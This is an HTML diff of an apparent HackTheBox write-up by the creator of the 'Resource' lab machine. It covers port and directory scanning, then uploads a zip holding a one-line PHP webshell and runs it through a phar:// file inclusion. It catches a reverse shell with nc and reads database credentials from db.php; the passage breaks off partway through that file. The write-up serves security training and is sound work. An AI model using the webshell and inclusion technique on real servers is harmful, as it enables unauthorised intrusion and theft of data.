@@ -1,0 +1,911 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Resource</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-resource">htb-resource</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#ssh">ssh</a> <a class="post-tag" href="/tags#ssh-certificate">ssh-certificate</a> <a class="post-tag" href="/tags#phar">phar</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#har">har</a> <a class="post-tag" href="/tags#bash">bash</a> <a class="post-tag" href="/tags#bash-glob">bash-glob</a> <a class="post-tag" href="/tags#htb-zipping">htb-zipping</a> <a class="post-tag" href="/tags#htb-codify">htb-codify</a> </span><br/><br/>
+<time class="dt-published" datetime="2024-11-23T14:45:00+00:00" itemprop="datePublished">Nov 23, 2024
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2024/11/23/htb-resource.html" style="color: #e6e6e6; text-decoration: none;">HTB: Resource</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/resource-cover.webp" type="image/webp"/>
+<img alt="Resource" class="include_image" loading="lazy" src="/img/resource-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Resource is the 6th box I’ve created to be published on HackTheBox. It’s designed around an IT resource center for a large company who has had their responsibilities for SSH key signing moved up to a different department. I’ll start by creating a ticket with a zip attachment and using a PHAR filter to execute a webshell from that attachment, providing access to the ITRC container. There I’ll get access to the ticket DB and find a .har file with credentials in it. That user has access to the old SSH certificate signing key, which is still valid on this server, and allows for root access. As root, I can find a script that interacts with the IT API for generating SSH certificates, where I can sign an SSH key that gets me onto the main host. There I’ll learn the principal name to pivot to another user and use the API to generate a certificate as that user. That user can run a bash script as root to generate certificates, but there’s a check to make sure the key for this server isn’t used. I’ll abuse a bash glob vulnerability to leak that key, and generate an SSH certificate that gives root access to the IT server.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/619 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/resource" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Resource</a> <a href="https://hackthebox.com/machines/resource" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-resource.webp" type="image/webp"/> <img alt="Resource" class="img-av" src="/icons/box-resource.png"/></picture></a><br/><a href="https://hackthebox.com/machines/resource" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1819047968302899680">03 Aug 2024</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">23 Nov 2024</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><s><span class="diff-Medium">Medium [30]</span></s><br/><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/resource-diff.webp" type="image/webp"/><img alt="Rated difficulty for Resource" src="/img/resource-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/resource-radar.webp" type="image/webp"/><img alt="Radar chart for Resource" src="/img/resource-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:51:08</span><a href="https://app.hackthebox.com/users/785708" rel="noopener" target="_blank"><img alt="Coontzy1" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/785708" style="display: unset"/><span class="user-text" style="display: none"> Coontzy1</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">03:25:38</span><a href="https://app.hackthebox.com/users/260094" rel="noopener" target="_blank"><img alt="NLTE" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/260094" style="display: unset"/><span class="user-text" style="display: none"> NLTE</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/4935" rel="noopener" target="_blank"><img alt="0xdf" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/4935" style="display: unset"/><span class="user-text" style="display: none"> 0xdf</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds three open TCP ports, SSH (22, 2222) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.27
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 16:35 GMT
+Nmap scan report for 10.10.11.27
+Host is up (0.15s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,2222 <span class="nt">-sCV</span> 10.10.11.27
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 16:37 GMT
+Nmap scan report for 10.10.11.27
+Host is up (0.14s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 78:1e:3b:85:12:64:a1:f6:df:52:41:ad:8f:52:97:c0 (ECDSA)
+|_  256 e1:1a:b5:0e:87:a4:a1:81:69:94:9d:d4:d4:a3:8a:f9 (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://itrc.ssg.htb/
+2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
+|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.40 seconds
+</span></code></pre></div></div>
+<p>Based on the OpenSSH versions, there seems to be two hosts, one running Debian and one Ubuntu.</p>
+<p>The webserver is redirecting to <code class="language-plaintext highlighter-rouge">itrc.ssg.htb</code>. I’ll add that to my <code class="language-plaintext highlighter-rouge">hosts</code> file along with the parent domain:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.27 itrc.ssg.htb ssg.htb
+</code></pre></div></div>
+<h3 id="itrcssghtb---tcp-80">itrc.ssg.htb - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The page is for an IT resource center:</p>
+<picture>
+<source srcset="/img/image-20241120164648536.webp" type="image/webp"/>
+<img alt="image-20241120164648536" class="include_image" loading="lazy" src="/img/image-20241120164648536.png"/>
+</picture>
+<p>I’m able to create an account and log in, and it gives a simple dashboard:</p>
+<picture>
+<source srcset="/img/image-20240216164726013.webp" type="image/webp"/>
+<img alt="image-20240216164726013" class="include_image" loading="lazy" src="/img/image-20240216164726013.png"/>
+</picture>
+<p>I can create a ticket:</p>
+<picture>
+<source srcset="/img/image-20240218083846973.webp" type="image/webp"/>
+<img alt="image-20240218083846973" class="include_image" loading="lazy" src="/img/image-20240218083846973.png"/>
+</picture>
+<p>It shows up in the dashboard:</p>
+<picture>
+<source srcset="/img/image-20240218083901515.webp" type="image/webp"/>
+<img alt="image-20240218083901515" class="include_image" loading="lazy" src="/img/image-20240218083901515.png"/>
+</picture>
+<p>And can be viewed:</p>
+<picture>
+<source srcset="/img/image-20240218083920083.webp" type="image/webp"/>
+<img alt="image-20240218083920083" class="include_image" loading="lazy" src="/img/image-20240218083920083.png"/>
+</picture>
+<p>Comments show up as activity:</p>
+<picture>
+<source srcset="/img/image-20240218083942472.webp" type="image/webp"/>
+<img alt="image-20240218083942472" class="include_image" loading="lazy" src="/img/image-20240218083942472.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>All of the pages on the site have URLs like <code class="language-plaintext highlighter-rouge">http://itrc.ssg.htb/?page=dashboard</code>. This feels like PHP. Visiting <code class="language-plaintext highlighter-rouge">http://itrc.ssg.htb/index.php</code> returns the dashboard page if logged in, the welcome page if not. So it is a PHP site.</p>
+<p>The HTTP response headers set a <code class="language-plaintext highlighter-rouge">PHPSESSID</code> cookie on first visit:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 18 Feb 2024 13:37:19 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">3120</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/8.1.27</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=3933818570351c6d55aca1650073214f; path=/</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">X-Powered-By</code> header also shows PHP.</p>
+<p>The 404 page is an <a href="/cheatsheets/404#apache--httpd">Apache 404</a>:</p>
+<picture>
+<source srcset="/img/image-20240218084159850.webp" type="image/webp"/>
+<img alt="image-20240218084159850" class="include_image" loading="lazy" src="/img/image-20240218084159850.png"/>
+</picture>
+<p>This is interesting because the <code class="language-plaintext highlighter-rouge">Server</code> header shows nginx. I noted above that there were two SSH ports with different OSes. nginx is likely the front proxy, sending requests to a container that’s running Apache.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="600"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://itrc.ssg.htb <span class="nt">-x</span> php
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.9.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://itrc.ssg.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.9.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        9l       31w      274c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      277c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       39l      207w     3120c http://itrc.ssg.htb/
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://itrc.ssg.htb/logout.php =&gt; </span><span class="feroxbuster-yellow">index.php</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       11l       40w      566c http://itrc.ssg.htb/register.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       10l       31w      433c http://itrc.ssg.htb/login.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      314c http://itrc.ssg.htb/uploads =&gt; </span><span class="feroxbuster-yellow">http://itrc.ssg.htb/uploads/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      313c http://itrc.ssg.htb/assets =&gt; </span><span class="feroxbuster-yellow">http://itrc.ssg.htb/assets/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        3l        5w       46c http://itrc.ssg.htb/admin.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      310c http://itrc.ssg.htb/api =&gt; </span><span class="feroxbuster-yellow">http://itrc.ssg.htb/api/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        5l      110w      844c http://itrc.ssg.htb/home.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        0l        0w        0c http://itrc.ssg.htb/db.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       39l      207w     3120c http://itrc.ssg.htb/index.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      316c http://itrc.ssg.htb/assets/js =&gt; </span><span class="feroxbuster-yellow">http://itrc.ssg.htb/assets/js/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      317c http://itrc.ssg.htb/assets/css =&gt; </span><span class="feroxbuster-yellow">http://itrc.ssg.htb/assets/css/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      317c http://itrc.ssg.htb/assets/img =&gt; </span><span class="feroxbuster-yellow">http://itrc.ssg.htb/assets/img/</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://itrc.ssg.htb/api/login.php =&gt; </span><span class="feroxbuster-yellow">http://itrc.ssg.htb/</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://itrc.ssg.htb/api/register.php =&gt; </span><span class="feroxbuster-yellow">http://itrc.ssg.htb/</span><span class="go">
+</span><span class="feroxbuster-red">500</span><span class="go">      GET        0l        0w        0c http://itrc.ssg.htb/api/admin.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       13l       25w      367c http://itrc.ssg.htb/assets/js/flash
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       23l       62w     1267c http://itrc.ssg.htb/header.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       10l       34w      982c http://itrc.ssg.htb/footer.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        3l        5w       46c http://itrc.ssg.htb/dashboard.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      155l      300w     2453c http://itrc.ssg.htb/assets/css/main
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       72l      231w     2380c http://itrc.ssg.htb/assets/js/filter
+</span><span class="feroxbuster-green">200</span><span class="go">      GET     4075l    23750w  1953379c http://itrc.ssg.htb/assets/img/helpdesk
+</span><span class="feroxbuster-green">200</span><span class="go">      GET     5106l    29400w  2505094c http://itrc.ssg.htb/assets/img/office
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        3l        5w       46c http://itrc.ssg.htb/ticket.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      834l     4513w    74121c http://itrc.ssg.htb/api/phpinfo.php
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m    210000/210000  0s      </span><span class="feroxbuster-green">found</span><span class="go">:27      </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30000/30000   413/s   http://itrc.ssg.htb/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30000/30000   413/s   http://itrc.ssg.htb/uploads/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30000/30000   414/s   http://itrc.ssg.htb/assets/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30000/30000   413/s   http://itrc.ssg.htb/api/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30000/30000   413/s   http://itrc.ssg.htb/assets/js/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30000/30000   414/s   http://itrc.ssg.htb/assets/css/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30000/30000   413/s   http://itrc.ssg.htb/assets/img/
+</span></code></pre></div></div>
+<p>Most of this I can see by browsing the site. There is an <code class="language-plaintext highlighter-rouge">admin.php</code>.</p>
+<h4 id="adminphp">admin.php</h4>
+<p>Trying to visit <code class="language-plaintext highlighter-rouge">/admin.php</code> directly just redirects to <code class="language-plaintext highlighter-rouge">/</code>. But adding it as <code class="language-plaintext highlighter-rouge">/?page=admin</code> works and loads the admin dash board:</p>
+<picture>
+<source srcset="/img/image-20241121170343055.webp" type="image/webp"/>
+<img alt="image-20241121170343055" class="include_image" loading="lazy" src="/img/image-20241121170343055.png"/>
+</picture>
+<p>This was not intended by the author (me), and I’m sad I didn’t catch this.</p>
+<p>There’s nothing super useful here, but it does provide some rabbit holes. The “Check Server Up” tool will ping a host. For example, giving it my host:</p>
+<picture>
+<source srcset="/img/image-20241121170528828.webp" type="image/webp"/>
+<img alt="image-20241121170528828" class="include_image" loading="lazy" src="/img/image-20241121170528828.png"/>
+</picture>
+<p>And there’s ICMP at my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+17:02:00.187798 IP 10.10.11.27 &gt; 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
+17:02:00.187819 IP 10.10.14.6 &gt; 10.10.11.27: ICMP echo reply, id 2, seq 1, length 64
+</span></code></pre></div></div>
+<p>However, this isn’t vulnerable to command injection.</p>
+<p>The second button pops up:</p>
+<picture>
+<source srcset="/img/image-20241121170617430.webp" type="image/webp"/>
+<img alt="image-20241121170617430" class="include_image" loading="lazy" src="/img/image-20241121170617430.png"/>
+</picture>
+<p>This was meant to show that nothing happened, and maybe a ticket will happen someday. The tools to provision an SSH user are disabled (as the story will show later).</p>
+<p>And while I can see all the tickets, clicking on one shows:</p>
+<picture>
+<source srcset="/img/image-20241121170718372.webp" type="image/webp"/>
+<img alt="image-20241121170718372" class="include_image" loading="lazy" src="/img/image-20241121170718372.png"/>
+</picture>
+<p>This is just an unintended dead end.</p>
+<h2 id="shell-as-www-data-in-itrc">Shell as www-data in itrc</h2>
+<h3 id="site-behavior">Site Behavior</h3>
+<h4 id="uploads">Uploads</h4>
+<p>I’m not able to get a non-zip file to upload to the site. Anything I do to try to get a PHP webshell into the raw file results in:</p>
+<picture>
+<source srcset="/img/image-20240218091845620.webp" type="image/webp"/>
+<img alt="image-20240218091845620" class="include_image" loading="lazy" src="/img/image-20240218091845620.png"/>
+</picture>
+<p>If the file name doesn’t end in <code class="language-plaintext highlighter-rouge">.zip</code>, it fails as well.</p>
+<p>When I do upload, the path to the zip is to a file in <code class="language-plaintext highlighter-rouge">/uploads/</code> where the file looks like a hash with the <code class="language-plaintext highlighter-rouge">.zip</code> extension.</p>
+<h4 id="page">page</h4>
+<p>My guess at how the site works is that <code class="language-plaintext highlighter-rouge">index.php</code> is <code class="language-plaintext highlighter-rouge">include</code>ing another PHP page based on the <code class="language-plaintext highlighter-rouge">page</code> parameter. If I try <code class="language-plaintext highlighter-rouge">page=index</code>, it loads a blank page with the header and footer:</p>
+<picture>
+<source srcset="/img/image-20240218091458092.webp" type="image/webp"/>
+<img alt="image-20240218091458092" class="include_image" loading="lazy" src="/img/image-20240218091458092.png"/>
+</picture>
+<p>Same with <code class="language-plaintext highlighter-rouge">page=db</code>. If I try a page that doesn’t exist, it returns the dashboard:</p>
+<picture>
+<source srcset="/img/image-20240218091535233.webp" type="image/webp"/>
+<img alt="image-20240218091535233" class="include_image" loading="lazy" src="/img/image-20240218091535233.png"/>
+</picture>
+<p>It seems like it’s checking for the page to exist before including it. That seems to prevent filters as well, such as <code class="language-plaintext highlighter-rouge">page=php://filter/convert.base64-encode/resource=index</code>.</p>
+<h3 id="webshell-via-phar">Webshell via Phar</h3>
+<h4 id="upload">Upload</h4>
+<p>My theory is that this site may work very similar to how the site on Zipping worked, and if that’s the case, it may be possible to upload a webshell inside a zip and access it via a Phar filter (just like <a href="/2024/01/13/htb-zipping.html#via-phar-filter">the unintended solution there</a>).</p>
+<p>I’ll create a simple PHP webshell:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>And add it to a Zip file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>zip shell.zip shell.php 
+<span class="go">  adding: shell.php (stored 0%)
+</span></code></pre></div></div>
+<p>I’ll upload that in a ticket:</p>
+<picture>
+<source srcset="/img/image-20241120170201822.webp" type="image/webp"/>
+<img alt="image-20241120170201822" class="include_image" loading="lazy" src="/img/image-20241120170201822.png"/>
+</picture>
+<h4 id="access">Access</h4>
+<p>Hovering over the link to the zip shows the full path:</p>
+<picture>
+<source srcset="/img/image-20241120170229846.webp" type="image/webp"/>
+<img alt="image-20241120170229846" class="include_image" loading="lazy" src="/img/image-20241120170229846.png"/>
+</picture>
+<p>In this case it’s <code class="language-plaintext highlighter-rouge">uploads/a34387cd3eef30b8d5938ed770909f9a536d8fe0.zip</code>.</p>
+<p>If the site is doing a <code class="language-plaintext highlighter-rouge">file_exists</code> check, one way to get around that is using the <code class="language-plaintext highlighter-rouge">phar</code> filter to access the zip. I’ll have it include <code class="language-plaintext highlighter-rouge">phar://uploads//a34387cd3eef30b8d5938ed770909f9a536d8fe0.zip/shell</code>. It will append the <code class="language-plaintext highlighter-rouge">.php</code> to get to the webshell. It works!</p>
+<picture>
+<source srcset="/img/image-20241120170444420.webp" type="image/webp"/>
+<img alt="image-20241120170444420" class="include_image" loading="lazy" src="/img/image-20241120170444420.png"/>
+</picture>
+<p>The error is that I didn’t provide a <code class="language-plaintext highlighter-rouge">cmd</code> parameter, but adding <code class="language-plaintext highlighter-rouge">&amp;cmd=id</code> fixes that:</p>
+<picture>
+<source srcset="/img/image-20240218092731828.webp" type="image/webp"/>
+<img alt="image-20240218092731828" class="include_image" loading="lazy" src="/img/image-20240218092731828.png"/>
+</picture>
+<h4 id="shell">Shell</h4>
+<p>I’ll update the command to a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a> (encoding the <code class="language-plaintext highlighter-rouge">&amp;</code> as <code class="language-plaintext highlighter-rouge">%26</code>):</p>
+<picture>
+<source srcset="/img/image-20241120170635293.webp" type="image/webp"/>
+<img alt="image-20241120170635293" class="include_image" loading="lazy" src="/img/image-20241120170635293.png"/>
+</picture>
+<p>At <code class="language-plaintext highlighter-rouge">nc</code>, I get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.27 59430
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@itrc:/var/www/itrc$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll upgrade my shell using the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">standard trick</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@itrc:/var/www/itrc$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="gp">www-data@itrc:/var/www/itrc$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@itrc:/var/www/itrc$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-msainristil-in-itrc">Shell as msainristil in itrc</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="users">Users</h4>
+<p>There are two users with home directories on this machine:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@itrc:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">msainristil  zzinter
+</span></code></pre></div></div>
+<p>www-data can’t access either. These are the same users with shells set in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@itrc:/home$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s2">"sh$"</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+msainristil:x:1000:1000::/home/msainristil:/bin/bash
+zzinter:x:1001:1001::/home/zzinter:/bin/bash
+</span></code></pre></div></div>
+<h4 id="web">Web</h4>
+<p>There are two directories in <code class="language-plaintext highlighter-rouge">/var/www</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@itrc:/var/www$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">html  itrc
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">html</code> is empty. <code class="language-plaintext highlighter-rouge">itrc</code> has a bunch of PHP files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@itrc:/var/www/itrc$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">admin.php          db.php          index.php     savefile.inc.php
+api                filter.inc.php  loggedin.php  ticket.php
+assets             footer.inc.php  login.php     ticket_section.inc.php
+create_ticket.php  header.inc.php  logout.php    uploads
+dashboard.php      home.php        register.php
+</span></code></pre></div></div>
+<p>There’s nothing too interesting in the PHP, but <code class="language-plaintext highlighter-rouge">db.php</code> has the database connection information:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$dsn</span> <span class="o">=</span> <span class="s2">"mysql:host=db;dbname=resourcecenter;"</span><span class="p">;</span>
+<span class="nv">$dbusername</span> <span class="o">=</span> <span class="s2">"jj"</span><span class="p">;</span>
+<span class="nv">$dbpassword</span> <span class="o">=</span> <span class="s2">"ugEG5rR5SG8uPd"</span><span class="p">;</span>
+<span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDO</span><span class="p">(</span><span class="nv">$dsn</span><span class="p">,</span> <span class="nv">$dbusername</span><span class="p">,</span> <span class="nv">$dbpassword</span><span class="p">);</span>
+
+<span class="k">try</span> <span class="p">{</span>
